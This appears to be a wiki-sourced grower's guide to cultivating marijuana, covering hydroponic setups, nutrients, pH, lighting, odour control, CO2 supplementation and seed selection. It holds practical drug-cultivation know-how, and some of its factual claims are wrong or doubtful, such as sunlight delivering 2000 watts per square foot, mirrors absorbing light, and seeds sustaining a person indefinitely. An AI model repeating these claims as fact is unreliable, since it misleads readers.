Leaves are generally '''not''' used recreationally and will generally give you a headache rather than get you high. There are however ways to extract the active ingredients from leaves and the different types of leaves have different potencies.

==== Large Shade Leaves ====
These are the large classically shaped leaves on the plant and are the least potent. There are extraction methods that can be performed to get something useful out of these but the result won't be very pure and many growers just throw them away.

==== Grow Tips ====
These clusters of small tender leaves are the point on the plant where new growth sprouts from during vegetation. They are more potent than Shade leaves but less potent than trim leaves or bud.

==== Trim Leaves ====
These are the sugar coated leaves that are trimmed from around the buds during harvest. The sugar coating of trichomes can make these quite potent and they can be as potent as low quality flower

=== Stems ===
The stems are not really useful for psychoactive purposes but they are a great source of plant fiber for rope, paper, etc.

=== Seeds ===
The seeds generally contain only trace amounts of psychoactive ingredients but they are one of the most nutritious foods currently known to man. They are one of only a handful of substances that man can sustain off indefinitely with no other food and provide all known amino acids.

=== Trichomes ===
Trichomes are the oil glands of the plant and contain the highest concentration of active ingredients of any part of the plant. The flowers are sought out because they contain the highest concentration of trichome and hash is made from collected and pressed trichomes. These are very useful for determining the maturity of a plant during the flowering stage.

=== Roots ===
The purpose of the roots is served when the plant is harvested. They have no useful levels of psychoactive ingredients and aren't typically eaten or smoked. There is a rumor that roots have high CBD content but lab analysis has shown THC and CBD ratios similar to the rest of the plant but in dramatically lower concentrations.&lt;ref&gt;http://www.micannalytics.com/login/edit.php?sampleid=112302&amp;dispensary=144&lt;/ref&gt; The source of the rumor appears to be an online news article.&lt;ref&gt;http://twicebakedinwashington.com/2013/05/09/the-cbd-cannabis-root-experience/&lt;/ref&gt;

=== Of Myths and Magic ===
There is certainly as much myth and folklore spreading around about marijuana usage and cultivation as anything else. This book attempts to slash through those myths to actual proven and utilized techniques that have been put into practice. It is highly recommended that you consider the tested information in this book as a primary source of information and doubt conflicting third party information until it is proven to you.

Some common myths that are seen include the use of menstrual blood for flowering. The claim that baking soda and vinegar will kill plants if used to adjust PH. Some people claim that absolutely any light level whatsoever will destroy crops and others claim that a couple hours of light in the middle of the dark cycle will improve the size of flowers. If you want to know the truth about these claims just dive on in ahead. Everything you need to grow high quality, potent, and high yielding marijuana plants is contained in these pages.

      <text xml:space="preserve">=== Dirt vs Hydroponic ===
This selection is very fundamental to how you will grow from here on in. That said, it is possible for a skilled grower to achieve similar results using either method. The myths surrounding this choice are many. There are those who claim that hydroponic (or hydro) bud has a bad, chemically, metallic taste or that soil grown marijuana isn't potent. Although there is plenty of bad tasting hydro and weak soil grown marijuana these differences are caused by poor practices elsewhere in the growing process and not whether soil or hydro is used as the growing method. For instance, hydro growers are often commercial growers who are trying to output as much marijuana in as short a time as possible. These growers do not take the time to purge and cure their plants at the end of the flowering cycle and after harvest. This is rumored to cause the bad taste. It is entirely possible to make this same error with a soil grow.

==== Dirt ====
Dirt carries a number of benefits and pitfalls. Dirt is easy to acquire and easy to maintain it is literally all over the ground. Dirt allows you to mix your nutrients into the potting soil rather than having to carefully mix up nutrient solution with each watering. Dirt retains moisture for a period of days so if you go on vacation no special steps will be needed. Dirt buffers the roots of a plant from nutrients and PH fluctuations. This is both good and bad. When you add nutrients they are delivered slowly and it may take longer before the effects of doing this become apparent. It is very easy to over water in a soil grow. This is a common beginner mistake. You should always allow the soil to dry completely to the touch before watering again. This is needed to allow oxygen to get to the roots.

The ideal PH for soil grows is 6.5 and can be taken by measuring the runoff when you water. The best way to maintain the PH on a soil grow is to maintain the PH of the water you are using. This range allows the uptake of manganese. The utility of this nutrient in plant growth is debated but what is not debated is that manganese is not available to the plant at the ideal hydro PH.

If a PH or nutrient imbalance occurs in a soil grow it may be corrected by flushing with lots of water or using a flushing agent such as clearex. In a pot it should be at least three times the capacity of the pot. Outdoors in the ground you should flush with water thoroughly with a hose or bucket.

==== Hydroponic ==== 
Hydroponic systems range from very simple to very complex. Essentially the only thing that differentiates a hydro system from a dirt grow is that in a hydroponic system a solution of nutrients and water delivers all nutrients to the plant and the physical medium that the plant grows in is inert with no nutrient content. The advantage of hydroponic methods is that they provide more rapid nutrient availability to the plant. This allows the plant to drink as much nutrient as it likes and produces larger plants in a shorter period of time and smaller space. Popular methods include:

===== Ebb and Flow =====
An ebb and flow system uses a timer to activate a pump that periodically floods the plants grow medium with nutrient solution and then drains the solution out. 

Often these system are designed using two plastic tubs, one sitting in another. The bottom tub contains the nutrient solution reservoir, the water pump, and an air stone (more oxygen means healthier roots) and the top tub or tray contains the plants. A single hole in the top tub allows the pump tubing into the tub, when the pump shuts off or in the event of a pump failure the water drains right back down the hole it came out of. It is usually best to put another hole where it will drain down to the bottom tub at the highest level you want the water to reach. This prevents flooding. A system like this can run at different intervals depending on the grow medium you use but a common choice is 15min on and off cycles, or 30 minute on and off cycles.

Be very careful with a system like this. If a pump failure is not detected plants can die in a very short time period.

PH and Nutrient problems can be corrected in the reservoir without the need to fiddle with the plants themselves.

===== Deep Water Culture =====
Deep water culture is a very popular technique where one bucket is fitted into another. In the bottom bucket is placed an airstone (limewood or porous stone) and in the top bucket holes will be drilled to allow nutrient solution to flood the bucket to a certain level. The airstone provides oxygen to prevent the roots from rotting even though they are submerged. This is a very simple system to build but requires a pot for each plant.

Correcting PH and nutrient problems is a matter of changing the solution and rinsing the plant medium with clean water.

===== Nutrient Film Technique (NFT) =====
Nutrient film technique involves plants potted so their roots dangle down into a thin film of constantly running nutrient solution. This technique can work well for large scale hydroponic growing operations but if the nutrient film is interrupted it can be devastating. A separate reservoir is maintained in this technique and it is not commonly used in practice.

===== Aeroponic =====
Aeroponics is a relatively new technique. A fine mist of highly oxygenated nutrient solution is sprayed onto the roots of the plant which are suspended in air rather than bound in soil or another medium.

===== Wick/Hempy Bucket =====
Wick systems and Hempy buckets are very similar. In a wick system a pot with medium has a wick placed down it that extends down into a reservoir and draws up nutrients via capillary action as they are needed or water evaporates. This is much like the way a lantern or wick lighter works, drawing flammable fluid up the wick to be burned until it is exhausted.

The hempy bucket is named after the forum poster who claims to have developed it although the concept may date back further. A simple 2.5 to 5 gallon bucket has a 3/4 inch hole drilled about 2-2.5 inches above the bottom. Depending on the medium and size of the medium used it may not be needed but it is common to glue a piece of plastic screening over the hole on the inside of the bucket. This bucket is then filled with a mixture of perlite and vermiculite (popular mixes are 3 parts perlite to 1 part vermiculite and 1 part vermiculite to 1 part perlite).

The bucket is then watered with full strength nutrient solution every 3-4 days, you water until nutrient comes out the hole in the bottom. This flushes out any built up nutrient salts with every watering assuring that you have a perfect balance.

A hempy is as simple as hydroponics gets and is capable of producing the same yields and quality output as other more complex hydroponic systems. Because it allowed to mostly dry between waterings and pulls nutrients up via perlite wicking the roots are very well oxygenated. Since fresh nutrient is added every 3-4 days there is no reservoir to become imbalanced. Although it looks like dirt the perlite/vermiculite medium is completely inert, it contains no nutrients and provides no PH or nutrient buffer. Plants can drink all the nutrient they want just as in other hydroponic systems.

The hempy system has the advantage that because it is simple there are fewer mistakes to be made. Also important is the fact that the hempy bucket has no pumps of any kind that can fail without you noticing. Hempy buckets can be used in a greenhouse outdoors with no power at all. Like a soil grow the medium retains moisture so you can leave the bucket for up to a week with no adverse affects.

The downfalls compared with other hydroponic systems are that plants must be moved one by one in buckets if moved. You also must water a hempy bucket by hand every 3-4 days and with a large number of plants that can become very labor intensive. For instance, for someone who could not carry a five gallon bucket filled with water a hempy installation of more than 3-4 plants would probably be unmanageable unless the water source was very close by. Because you flush out the nutrient solution and any unused nutrients in it every few days the hemp bucket also requires more nutrients than other hydroponic methods.

===== Continuous Drip System =====
Another popular technique is the continuous drip system. With a continuous drip a reservoir (often large outdoor garbage cans or 5 gallon buckets) are used with a pump to push nutrients and water through a hose. Some guerrilla growers don't use a pump because they don't have the pressure of a hose to actuate it. The hose will have holes or drip emitters placed at the base of each plant as to get the water right where its needed (the roots).

===== Consideration and Pitfalls =====
It is important with any hydroponic system to remember that there is no buffer. Plants will respond very quickly if there are no nutrients and/or water or the pH of the nutrient solution is incorrect. Roots need high oxygen levels or they will rot. And of course remember that plants need space to grow and should never be planted where their roots will intermingle.

Ideal pH level with hydroponic systems is between 5.8 and 6.3 depending on the nutrients that are used, however a consistent pH of 6.0 is very common. The best way to handle a pH adjustment depends on whether you are using a reservoir or not. In a hempy bucket the best solution is to flood with nutrient that is corrected. This will push out the imbalanced nutrient. With a reservoir pH can be adjusted in the same manner as the water with a pH up and pH down solution.

      <text xml:space="preserve">=== Inside vs Outside ===
This is probably the single biggest divider of growers that there is. Do you grow outdoors under the big bright sun or indoors in a room or closet? There are definitely pros and cons to either method. 

==== Outdoor ====
The benefits of an outdoor grow are obvious, you don't need to worry about ventilation or light. The sun provides 2000 watts per square foot of bright light and that is certainly more than any indoor grower is likely to have at his disposal any time soon. Make no mistake that light difference is important! The air is fresh and plentiful and will deliver all the CO2 that your plants will ever need. Organic nutrients can be found in the soil and if they can't in your location you can always prep your soil. Finally the roots of your plants will be able to spread far and wide. There are also downsides to be considered. You have no control over light cycles and must grow on the natural annual harvest cycle, you have absolutely no privacy and some areas require you to take privacy precautions in order to grow for medical use. Outdoors you have open ventilation which means your plants could be pollinated by wild pollen messing up your attempts to breed seed of a certain strain or avoid seed. You are also mostly limited to soil grows outdoors unless you have a greenhouse which is sort of a hybrid of indoor and outdoor growing.

==== Indoor ====
The benefits of an indoor grow are not necessarily immediately realized. It is obvious that an indoor grow affords more privacy but the biggest benefit of an indoor grow is control. You can control what type of light is provided, how often its provided and the hours. You can control the temperature and humidity of your grow environment to make them optimal for the plant. You can easily switch between hydroponic and organic growing. Indoors you will have a smaller harvest (plants simply aren't going to grow as large without a light as large as the sun) but you will be able to use lights to have plants in varied stages of growth at all times so you can harvest more plants more often. Indoors you might be able to harvest every two months in an established garden or even more often in a larger grow.

      <text xml:space="preserve">=== Organic vs Inorganic ===
The organic vs inorganic choice is a hot topic. You don't need a book to help you make any moral decisions so its just the facts here. The plant material that the plant grows is identical in structure and content regardless of which method you use. The plant only uses basic building blocks, taking molecules from the air and the nutrients and assembling them into the plant matter. The by product of this process is oxygen.

The real (practical) difference between organic and inorganic growing is how the raw materials are provided. An organic grower will use larger elements that will be broken down by a system of organisms living in the nutrient solution/grow medium or the soil. An inorganic grower uses nutrients that are already broken down into a form that the plant can utilize. Non-organic nutrients might contain organic components. For instance, many fertilizers intended for soil will include urea nitrogen. This nitrogen requires micro-organisms to break it down before the plant can use it. These organisms won't thrive without soil so these fertilizers may not work in hydroponic systems.

There are hydroponic mixtures that are organic and there are those which are not. Either way, you have control over what you feed your plants and can insure that no harmful pesticides or other chemicals are used in growing your own marijuana. Provided you flush your plants properly they won't contain any of the nutrient solution so the actual plant material that results should be the same.

      <text xml:space="preserve">=== Nutrient Selection and Maintenance ===
Nutrient selection is a very important part of your growth plan. This book will not advocate any specific nutrient blend or mix but instead will cover nutrients in a more general manner.

There are three macro nutrients that must be considered when growing marijuana, (N) Nitrogen, (P) Phosphorus, and (K) Potassium. Almost every plant additive you look at will specify these numbers often in the format N-P-K without actually labeling which is which. These numbers really don't let you compare competing products effectively but they do show you the ratios of one macro ingredient to the next. During the different growth phases you will want different concentrations of these macro nutrients. During vegetative growth you will want high nitrogen and low phosphorus and during flowering you will want high phosphorus and lower nitrogen. It is worth busting another myth here. Many people believe that because there are separate vegetative and flowering formulas that having high P during veg or high N during flowering will hurt things. This simply isn't true. It is wasteful to throw away chemicals that are not needed and there is a maximum nutrient concentration that plants can handle without burning roots. This means that you wouldn't want to trade P for N during flowering. But most flowering formulas actually contain enough N that they could be used during vegetative growth.

There are also a number of micro-nutrients needed for growth that must be present. Many major fertilizers for soil do not contain these micro-nutrients because they assume it will be provided in the soil. Always use hydroponic nutrients for hydroponic growing.

Regardless of what nutrients you use, they will be mixed with water. The water you use should ideally be reverse osmosis treated or if tap water is a must then make sure to let it sit out overnight to let any chlorine contained in it evaporate. This is a deceptive thing in that chlorinated tap water will work fine but will prevent your plant from ever reaching its full potential. This is a great place to squash the rain water myth. Rain water is full of minerals, dirt, and living organisms it is neither the best nor the worst choice for growing plants. In particular if you are using an indoor grow or hydroponic rig you will not desire to use rainwater since it will contain heavy amounts of minerals that you did not intend to add to your carefully controlled growth system.

==== Dry vs Liquid ====
Liquid nutrients are very trendy and hip in the hydroponic world. There is nothing wrong with a Liquid nutrient, you know it will mix well but they are generally more expensive because the bottle contains more water and less nutrient. This also makes them more expensive to ship and transport. When it comes time to mix them and feed your plant either dry or Liquid works equally well.

In both cases you should add to the water after filling the container rather than adding nutrients and then filling. Adding before filling can lead to nutrient imbalances.

==== Flushing Soil ====
Nutrient salts will build up in soil it is highly recommended that you flush your soil plants with clean water from time to time. If in a pot flush with 3 times the volume of the pot with water and for plants in the ground flush until the ground is fully saturated and possibly repeat the following day. This is also recommended if the plants show signs of nutrient or ph imbalance.

==== Maintaining a Reservoir ====
Proper maintenance of your reservoir is essential to growing healthy marijuana to its full potential if you grow using a hydroponic method that requires you to keep a res. The critical factors here are nutrient levels and PH. Unfortunately, there is no simple way to track the level of individual nutrients in your reservoir but there are ways to keep a healthy reservoir system going just the same.

To begin, you will want to mix your nutrients at full strength according to the manufacturers recommendations. You should use either reverse osmosis treated water or if you must use tap water draw it from the cold water tap and let your water sit overnight to evaporate chlorine. Hot water will contain more dissolved impurities than cold water. After adding your nutrients and micro-nutrients you should adjust your PH to 5.8 which is ideal for hydroponic nutrient solution. Measure the TDS, or total dissolved solids with a TDS meter. With full strength nutrient solution this number will probably be around 1100-1300 TDS. This will be where you want to keep your nutrient (if using lower strength nutrient for earlier stages then mix and measure TDS accordingly).

Now all you need to do is top off your nutrient solution with clean water daily. If your TDS is low then add nutrients. If your PH is off then adjust it.

Since the plant will not absorb nutrients in the same proportions you are adding them imbalances will result over time. To correct this you will periodically need to drain and fill your reservoir with fresh nutrient solution. To begin with do this at least once a month and just before you start flowering. During flowering change the reservoir every two weeks. How often you actually need to do this depends on the plants, the nutrients, the size of the reservoir, etc. Luckily the plants will let you know how often you need to do this. They will start exhibiting signs of nutrient deficiency when there is an imbalance and you will know that you can't go longer than that before changing the reservoir. Especially with clones you will be able to get res changes down to a system of clockwork since the clones will generally all have the same nutrient preferences.

==== PH Ideals and Adjustment ====
The ideal PH for your garden is based on nutrient uptake. A PH that is too low will be too acidic and burn the roots of your plant. A PH that is too high will be too alkaline and cause your plants roots to be unable to uptake nutrients. Many supposed nutrient deficiency problems are really caused by improper PH levels. PH can be tested with a digital meter (ideal), or with chemical drop tests or test strips. Because PH optimally should be adjusted to a tenth of a point accuracy a digital meter is highly recommended.

Depending on your method of grow and whether you are using soil or hydroponic different nutrients will be absorbed at different PH levels. For a hydroponic garden the only PH level that all nutrients will be absorbed at is 5.8. For soil gardens the ideal PH is 6.5.

===== Adjusting PH =====
Leaving tap water to sit out overnight will evaporate chlorine and raise PH. Adding nutrients will lower PH. But once you have done those things how do you move the PH to where it needs to be?

There are a couple simple ways to do this. There are commonly sold chemicals known as PH up and PH down sold at hydroponic gardening stores that will adjust PH for you. Similar chemicals are also sold for pools but these are not recommended for plants. But the easiest method can be found in your kitchen. Simple baking soda and distilled white vinegar will adjust PH up and down respectively. These should be used in very small amounts. You might need to play with them to find what is needed for your water source and nutrients (it should remain consistent once you've found what you need to add). I find that in a 4 gallon flowering nutrient mix 1/2 tsp is enough to raise the PH from 5.0 to 5.8.

PH adjustment chemicals should be added after all nutrients. After adding PH adjustment chemicals mix well and then give your water a couple hours for everything to stabilize. If you are using baking soda and vinegar then try to avoid using them in combination. Use either one or the other if possible. They will react with one another to form CO2. CO2 is great for plants leaves and flowers but is bad for plant roots.

      <text xml:space="preserve">=== Lighting ===
Lighting is probably the most crucial element in a grow. If you don't have proper lights then you won't get good results. Unfortunately, this remains true on a low budget and in order to grow indoors you will need to invest in a good light. A general rule of thumb for lighting is 2000 lumens per square foot.

==== Flourescent ====
Flourescent and Compact Flourescent lighting (CFL) is effective for growing marijuana but the spectrum is not ideal. When evaluating these lights you should always look at actual watts and not equivelent watts. These lights come in multiple spectrums but generally they are divided into warm, cool, and daylight spectrums. The daylight spectrum bulbs are ideal but you can use a combination of warm and cool bulbs in equal number as well.

Flourescents lack penetrating power and you will need to keep them within 6 inches of the plant tips except for rooting clones. For rooting clones you will want the lights about 18 inches above the plant tips. Flourescents work well for clones and seedlings that can't take bright or hot lights and also perform well for vegetative growth. Unfortunately these lights simply do not have the punch to perform well for flowering. They can be used in a pinch if you use lots of watts and a shallow grow area by training plants. Many cabinet growers do this with 150w CFL's.

These bulbs require a ballast in addition to a fixture, in CFL bulbs the ballast is built into the bulb.

==== Mercury Vapor ====
Mercury Vapor bulbs are cheap and readily available. But their spectrum makes them a poor choice for growing marijuana.

==== Incandescent ====
These bulbs are everywhere but they are extremely inefficient. You will pay a fortune lighting up these bulbs and reap little reward. These include so called 'grow bulbs' sold in stores.

==== LED Lighting ====
LED lighting has a number of advantages. The lamps have a fixed angle so no reflector is needed, all the light output is directed at the plants. LED lighting runs cool and the plants can grow right up to the lights. These lights produce light in a fairly tight spectrum and lamps are available that can be combined to stimulate all the photo sensitive hormones in the plant.

The downside is that the light spectrums of commonly available LED's aren't perfect for growing marijuana. The number of lumens output by LED's is actually fairly low and LED's are extremely expensive. This technology simply isn't there yet for growers but it will come in time.

==== Metal Hallide ====
Metal Hallide is a high intensity discharge lighting that produces a bluish light. This light spectrum works very well for the vegetative stage of growing but does not work especially well for the flowering cycle which requires more red spectrum for optimal growth. This type of lighting is very popular among growers who often purchase digital ballasts that can switch between these and HPS type bulbs.

==== High Pressure Sodium ====
High Pressure Sodium or HPS is the most popular type of bulb among knowledgable growers today. Most street lamps are HPS lighting. HPS lamps provide an excellent spectrum for flowering and although their spectrum is not quite right for vegetation there are spectrum corrected bulbs with more blue light that work well through the complete grow cycle. There are metal hallide conversion bulbs that work in HPS ballasts, and there are digital ballasts that can switch between the two types of bulb. A 400w HPS light puts out 55,000 lumens and the bulbs become more efficient up until the 600w bulb which puts out 95,000 lumens. The next largest commonly available size of HPS bulb is 1000w but these are less efficient and give fewer lumens per watt than the 600w lamps.

==== Special Bulbs ====
There are a number of special bulbs which you might encounter. You might encounter conversion bulbs, these bulbs allow you to run a lamp in a ballast intended for a different type of lamp. For instance, MH conversion for HPS ballasts and HPS conversion to MH ballasts. Additionally there are spectrum corrected HPS and MH bulbs that add blue and red spectrum respectively to make the lighting work better for growth. Yet other lamps have a reflector built into the bulb.

==== Reflectors ====
There are two reflectors you will certainly want to have. The first is on your lamp, these reflectors vary widely in price but generally you want a polished aluminum reflector that spreads the light well over your grow area. Some reflectors have hoods with an opening to attach ducting in order to keep the light cooler. There are also glass tube fixtures that ducting can connect to 'cool tubes' are the common term used for these.

The other reflector is that around your grow area. The best solution for this is some sort of reflective film such as reflective mylar. Mylar reflects 95% of light back at the plants. In a large space you might want to put the film on cardboard that can be position to enclose the grow to bring the walls in.

If you don't have access to mylar than flat white paint is recommended. Do not use a mirror, mirrors actually absorb light and do not use aluminum foil, it creates hot spots.

      <text xml:space="preserve">=== Ventilation and Odor Control ===
Ventilation is absolutely essential to plant health. Plants absorb CO2 and release oxygen. The roots in turn require oxygen so both must be present in your grow environment. Additionally odor control will be very important. Marijuana has a pungent odor and some strains can be smelled for miles without some form of odor control. 

==== Negative Ion Generation ====
Negative ion generators can help with odor control problems. These machines will use a negative charge to attract positively charged particles in the air. These are best purchased off the shelf but you do need to know that you shouldn't actually put the generator in the room with the Plants. They are said to interfere with the taste, odor, and even potency of the end product.

==== Ozone Generators ====
Ozone (o3) is what gives the air a fresh smell after a thunderstorm. Ozone oxidizes organic particles in the air but in high concentrations can irritate your lungs. For this reason ozone generators are typically put on the timer with on and off cycles to allow the system to output just enough ozone to control the odor.

These generators come in two basic varieties, corona discharge and uv generation. Since uv generators require longer exposure to the air the corona discharge systems are probably more sensible for most gardeners. There are plans online to make corona discharge units with neon sign transformers. This is definitely NOT recommended, these devices are a severe fire and electrocution hazard that will not be properly isolated and housed and will be placed in a wet environment. It is probably a safer and more effective idea to simply purchase a small used unit.

==== Odor Neutralizers and Masking Agents ====
One common technique for a small scale closet grow operation to build an odor remover bucket. Simply drill 1/2 inch holes around the top of a 5 gallon bucket. Fill the bucket with perlite or absorbent crystals and then add an odor neutralizer or masking agent chemical.

Odor neutralizing agents such as ONA are definitely more effective than those that merely mask odors.

==== Active Carbon Filtration ====
This technique involves forcing exhaust air through active carbon in order to filter out odors. This method is highly effective and very popular and can also be used in combination with the other methods. These filters can be purchased or you can find plans to construct them online. 

Ideally, you would use your exhaust fan to pull the air through the filter rather than push air through it.

==== Intake and Exhaust ====

Unless you are adding CO2 you should make sure that you have a highly effective exhaust system. You will want to make sure your exhaust fan is rated for high CFM under pressure. All fans will have a CFM rating, this rating is how many cubic feet of atmosphere the fan moves per minute. Your exhaust fan should be capable of evacuating your grow room at least once every five minutes. Multiply the width, height, and depth of your room to determine the total cubic feet, divide this number by five and you will have the minimum CFM fan rating needed. Of course this assumes the fan maintains its CFM under pressure and actually performs to specifications. In practice this doesn't happen. It is best to overshoot this rating as much as your budget will allow. Even if your fan does perform to specifications pulling more air through will help keep the temperature of the room down and exhaust the heat from powerful fans.

Generally squirrel cage and duct fans are used for exhaust systems. These fans can be connected to 4 inch and 6 inch flexible ducting that can be used to route the air where you want it and to pull air through a carbon filter.

In addition to your exhaust system you will need an air intake. For many systems a passive intake is used, simply providing a channel for fresh air to enter the grow room to replace the air being exhausted. For a larger area  or longer intake line you may need an active intake. Providing an active intake relieves pressure to allow the exhaust and intake to share the workload of air exchange. Otherwise the exhaust fan must provide the force required to pull air into the room as well as the force required to exhaust. 

==== CO2 Supplementation ====
CO2 Supplementation yields dramatically larger flowers than growing without adding CO2. The idea is to replicate earlier geological conditions when atmospheric carbon dioxide levels were higher and plants grew far larger than they do today. The ideal level of CO2 is between 1500-2000 ppm. There are many ways to add this CO2. CO2 moves very easily and weighs more than oxygen. Because of this you will want fans to be off during the period in which you are supplementing CO2. Because plants only utilize CO2 for photosynthesis you will only need to supplement during the lights on period.

===== Fermentation =====
This is done by fermenting sugars with yeast. Sometimes even basic sugar and water is used for this purpose. Others use a more sophisticated blend with nutrients for the yeast. You will need to use an airlock (tubing coming out of a sealed fermentation vessel or jug and placed in a cup of water so the CO2 has to bubble out through the water will work). This method is very cheap and easy to setup but while every bit helps this will not raise your CO2 levels to the ideal 1500-2000ppm.

===== Dry Ice =====
You can generate CO2 by simply melting dry ice (which is frozen CO2) but it is difficult to control the speed of release to precisely control the CO2 levels. Additionally you will need to add ice each day and the ice can not be kept in your freezer.

===== Vinegar and Baking Soda =====
When vinegar and baking soda react they release CO2. You can produce CO2 at a controlled rate by utilizing a drip system.

===== Propane Burners =====
Propane burners generate lots of CO2 and can be controlled but they also generate lots of heat that must be exhausted.

===== Stored CO2 Cannisters =====
These can be purchased with cash at any gas supply shop. This is the least expensive and most controlled way to supply CO2. The downside is that there is a high up front cost and a few calculations are required to determine how to setup the system and output CO2 at the proper rate.

The details of the setup will vary based on your equipment but there are a few basic components you will need to use this method. The first is a tank. Tanks must be refitted with new seals periodically. Generally a gas supply will exchange your cannister with another that has a similar amount of time left on it rather than fill the cannister on the spot. In addition to the cannister itself you will need a solenoid switch to allow you to use a timer to control when the tank releases gas and when it does not. A regulator is needed to regulate the pressure to a lower and fixed pressure that won't damage your other equipment. To the output of the regulator you will need a flow meter with needle valve. Usually this will consist of a tube with increment markings and a little ball that raises to show you how much CO2 is flowing through the flowmeter. This allows you to fine tune the output of your CO2 system. Finally you will need plastic tubing with holes in it in order to actually distribute the CO2 around the grow area. Remember CO2 is heavier than air and will fall downward when released out of the tube. This means you should position the tubing above your plants.

You can purchase all of these components aside from the cannister as kits sold for hydroponics. Follow the directions that come with the kit to set your timer, flowmeter, and regulator.

      <text xml:space="preserve">=== Temperature Control ===

Marijuana can survive between the temperatures of 60F to 92F but those are not ideal temperatures, those are the extremes the plant can generally survive without dying. Ideal temperature control allows you to grow larger and higher quality marijuana with denser buds. In fact, once the basic nutrient and light needs of the plant are met temperature control has the greatest impact on flower density of any other element.

The ideal range for marijuana is 75f-83f. Flower density will be determined not so much by the temperature you grow at but by the range of temperature. It is better to have plants that sit at 85f during the day and 83f at night than 75f at night and 83f during the day.

Getting those temperatures and temperature ranges can be quite a challenge but there are tricks to help. One simple trick is to have the hot lights run at night and have the dark period occur during the daytime hours. A small space heater or heating pad can be used to raise temperatures if needed. And of course airflow and air conditioning are a great way to remove heat and hot air from your grow environment. If your grow is closed for CO2 exchange then a dehumidifier is a great way to reduce temperatures.

      <text xml:space="preserve">=== Grow Mediums ===
Grow mediums exist to provide a stable base for your plant to grow its roots through and to hold up the weight of the plant. Over the years many substances have been found to fill this role and they have different properties. Often a grower will use one or more of these mediums depending on the methods he has chosen for growing and the desired properties of the medium in the container being used.

==== Soil ====
Good old earth. Soil is actually a composite of a number of substances and varies from one location to another. Soil is typically composed of rock, sand, clay, and organics. Organics are decomposed plant and animal matter and provide the nutrient content that is contained in soil, clay binds soil together and retains moisture, rocks and sand provide drainage to allow for root oxygenation. Additionally soil is usually teaming with microorganisms that are feeding on and breaking down the organics contained within it.

If growing a potted plant indoors you will probably want to mix at least perlite with your soil to enhance moisture retention. It is also highly recommended that potting soil be used in a pot rather than soil that you have dug from the ground. A potting mix can be more carefully designed for optimal plant health and the soil outside will contain many unwanted forms of insect life that can and will infect and kill your plants.

Another common concern with soil is that potting soils often already have fertilizers in them (in addition to the nutrients contained in the organics). In general, try to avoid potting soils with time release nutrients but if you do purchase a bag, be aware that the plant will not need any nutrients for a period of time and just water with clean water to avoid burning the roots.

==== Perlite ====
Perlite is a porous white substance that is very absorbant and excellent at retaining and wicking moisture. Perlite is often used for cloning and mixing with other grow mediums but can also be used on its own. Growers who use perlite as a sole grow medium will often purchase large coarse chunks rather than the smaller porous perlite that is more readily available in most areas. It is not recommended to use perlite in a circulating system because the fine dust that comes off the perlite will clog pumps over time. The same fine dust brings a recommendation that when handling perlite you utilize a respirator device so that the dust does not harm your lungs.

Perlite is completely inert substance so will not interfer with your feeding schedules. That said, there are manufacturers such as Miracle Grow that put nutrients in their brand of perlite even though it is not indicated on the label. This material can be used but should be flushed thoroughly with water to wash out the nutrients. Perlite should be washed anyway to remove the fine dust that builds up in it.

==== Vermiculite ====
Vermiculite is a crushed volcanic rock medium that provides excellent drainage when mixed with other grow mediums. Vermiculite is inert but is not particularly suitable for use as a grow medium by itself.

==== Rockwool ====
Rockwool is literally spun rock. Much the way sugar is spun into cotton candy the rock is spun into a material that looks similar to the spun glass used for insulation (but not so itchy). Rockwool is completely inert and most growers are using rockwool in some form. If allowed free drainage rockwool will retain just the right amount of moisture and drain the rest off.

Rockwool comes in multiple sizes of cube. There are smaller cubes or plugs that are typically used for seedlings or clones and larger blocks that are used in hydroponic systems such as ebb and flow trays. Some of the large blocks have holes in them to make it easy to insert the small plugs or cubes you used to clone the plant directly into the larger block

The only concern with rockwool is that it should be completely submerged in water for 8hrs prior to use in order to remove any air bubbles in the medium.

==== Hydroton ====
Hydroton is one name for a medium that consists of lava rock or clay pellets that are available in different sizes and usually have a red coating on the outside. This inert medium is effective in continuous drip and ebb and flow systems. It is also an excellent choice anywhere you need drainage and some have used it for the bottom couple of inches of a hempy bucket to facilitate free drainage.

==== Coconut Fiber ====
This is a fairly new medium that many are beginning to use. Coconut fiber offers some of the buffering capacity of soil, drains well, retains enough moisture to be useful, and has little nutrient content.

      <text xml:space="preserve">{{Marijuana Cultivation}}
== Seedlings ==
=== Selecting Seeds ===
Good marijuana simply can not be harvested from poor seed. There are thousands of strains of marijuana and established seed lines and breeders. All of these have different characteristics for you to select from. Among the traits to consider are size, duration of flowering period, yield, type of psychoactive effect, strength of psychoactive effect, THC content (this is NOT synonymous with psychoactive potency), odor, taste, and visual effect.
==== Quality of Source ====
The quality of source seeds is something you need to consider. Your sources can range from bag seed from dirt weed to clones from a plant with known premium pedigree properties.

Any grower will tell you that smokers don't know what is good and what is not. There are no shortage of smokers who have only experienced good marijuana in the form of a midgrade. These individuals tend to refer to any decent mid as skunk or chronic. There is nothing wrong with that but if you are one of those individuals you are about to attain a new level of awareness.

One thing you should note is that the quality of the buzz is actually more important than the potency. It really doesn't matter how potent the marijuana is or how high the THC content. A plant with a strong couchlock or cerebral high will have a peak effect and the potency of the plant only changes how much material must be used to achieve that effect. The end result of smoking lots of low potency marijuana is the same as smoking a smaller amount of the most potent and highest thc content marijuana with the same kind of buzz. This can be observed by smoking a sinsemillia bud and a pollinated bud from the same mother. Both will have the same effect, you just have to smoke more of the lower potency seedy material.

===== Bag Weed =====
Bag weed is a mystery. The genetics hiding in those seeds could hold many surprises and could hold the next great pedigree plant or they could hold nothing more than dirt weed. When evaluating bag weed there are a number of indicators to look for. The first is packaging. If the marijuana is packed in a brick or pressed into tight chunks that is has to be broken off of then this indicates that it is a heavily commercialized strain. This is fairly consistently low quality material. The next indicator is seediness. It is perfectly possible to lower the quality of premium marijuana by pollinating it but this sort of carelessness indicates that the grower either didn't care about what he was doing or didn't know. It is a fair bet that said grower didn't care or know about the strain either. Another important indicator is color of the plant material. A very dark brown, almost black indicates a highly competent curing method, next up is a nice green plant material that doesn't smell grassy and reveals the color of the hairs, purple plant material will tend to have less potency potential among pedigrees but has excellent bag appeal and generally will be of a pedigree strain, the absolute worst things to see are a light green plant material with a grassy smell and light brown material.

Now having considered those qualities you will of course want to consider the buzz delivered by the material, side effects like paranoia, dry mouth, and appetite stimulation. Also important is odor and appearance. Not all pedigree marijuana has a strong odor but a strong odor is usually a good sign. And of course taste is important. Some marijuana strains even have a nice fruity taste.

===== Purchased Seeds =====
